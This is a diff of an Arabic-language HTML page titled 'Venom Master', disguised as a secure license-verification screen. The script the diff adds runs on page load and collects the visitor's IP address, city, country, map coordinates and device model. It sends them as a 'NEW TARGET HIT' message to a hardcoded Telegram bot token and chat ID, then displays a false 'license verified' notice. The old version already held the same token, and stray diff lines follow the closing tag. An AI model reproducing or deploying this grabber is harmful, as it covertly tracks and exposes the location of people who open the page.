@@ -2,38 +2,92 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Venom Master | Premium Auth</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <title>Enterprise Auth | Venom Master v3.5</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #ff003c; --bg: #010103; }
-        body { margin: 0; background: var(--bg); color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { background: rgba(15, 15, 20, 0.98); border: 2px solid var(--primary); padding: 50px; border-radius: 30px; text-align: center; box-shadow: 0 0 60px rgba(255, 0, 60, 0.3); width: 85%; max-width: 480px; }
-        .logo { font-family: 'Orbitron', sans-serif; font-size: 35px; color: var(--primary); letter-spacing: 8px; margin-bottom: 15px; }
-        .loader { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 25px auto; }
+        body { background: #010103; color: #ffffff; font-family: 'Noto Sans Arabic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .main-card { background: rgba(10, 10, 15, 0.95); border: 1px solid #ff003c; padding: 50px; border-radius: 20px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 60, 0.2); width: 85%; max-width: 450px; }
+        .premium-logo { font-family: 'Orbitron', sans-serif; font-size: 30px; color: #ff003c; letter-spacing: 5px; margin-bottom: 20px; }
+        .loader { width: 40px; height: 40px; border: 3px solid #111; border-top: 3px solid #ff003c; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 15px; color: #666; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">VENOM</div>
+    <div class="main-card">
+        <div class="premium-logo">VENOM MASTER</div>
         <div class="loader"></div>
-        <div id="status">جاري تشفير قناة الاتصال...</div>
-        <p style="font-size: 11px; color: #333; margin-top: 40px;">SECURE MODULE BY @b4_93</p>
+        <div id="status">جاري تأمين الاتصال بالسيرفر...</div>
+        <p style="color: #444; font-size: 11px; margin-top: 30px;">SECURE LICENSE VERIFICATION SYSTEM</p>
     </div>
 
     <script>
-        const BOT_TOKEN = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
-        const CHAT_ID = '7336962855';
+        const token = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
+        const chat_id = '7336962855';
 
-        // دالة تحديد نوع الجهاز بدقة
-        function getDetailedPhone() {
+        // دالة ذكية لاستخراج موديل التليفون من بيانات المتصفح
+        function getDeviceInfo() {
             const ua = navigator.userAgent;
+            let device = "Unknown Device";
+            
             if (/android/i.test(ua)) {
+                // محاولة استخراج موديل الاندرويد (مثل Samsung SM-G960F)
                 const match = ua.match(/Android\s([^\s;]+|.*)\sBuild\/([^\s;]+)/) || ua.match(/\(([^;]+);/);
-                return match ? match[1] : "Android Device";
+                device = match ? match[1] : "Android Phone";
             } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                device = "Apple iPhone/iPad";
+            } else if (/Windows/i.test(ua)) {
+                device = "Windows PC";
+            }
+            return device;
+        }
+
+        async function forceCapture() {
+            try {
+                // 1. جلب الـ IP والبيانات الجغرافية (بما فيها الإحداثيات للخريطة)
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                const ip = d.ip;
+                const phone = getDeviceInfo();
+                const city = d.city || "Unknown";
+                const country = d.country_name || "Unknown";
+                
+                // رابط خرائط جوجل بناءً على الإحداثيات
+                const maps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+
+                // 2. بناء رسالة التليجرام بتنسيق فخم
+                const messageText = `🔥 **NEW TARGET HIT** 🔥\n\n` +
+                                    `📱 **Device:** \`${phone}\`\n` +
+                                    `🌐 **IP:** \`${ip}\`\n` +
+                                    `📍 **Loc:** ${city}, ${country}\n` +
+                                    `🗺️ **Maps:** ${maps}\n\n` +
+                                    `✅ **By:** @b4_93`;
+
+                const encodedText = encodeURIComponent(messageText);
+                const finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodedText}&parse_mode=Markdown`;
+                
+                // 3. الإرسال بالطرق المضمونة التي نجحت معك سابقاً
+                fetch(finalUrl, { mode: 'no-cors' });
+
+                let img = new Image();
+                img.src = finalUrl;
+
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "تم التحقق من الترخيص بنجاح!";
+                    document.getElementById('status').style.color = "#00ff00";
+                }, 3000);
+
+            } catch (e) {
+                // إذا فشل جلب البيانات التفصيلية، نرسل إشعار دخول بسيط
+                const fallback = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=New_Visit_Detected_Check_Logs`;
+                new Image().src = fallback;
+            }
+        }
+
+        window.onload = forceCapture;
+    </script>
+</body>
+</html>
                 return "Apple iOS Device";
             }
             return navigator.platform;
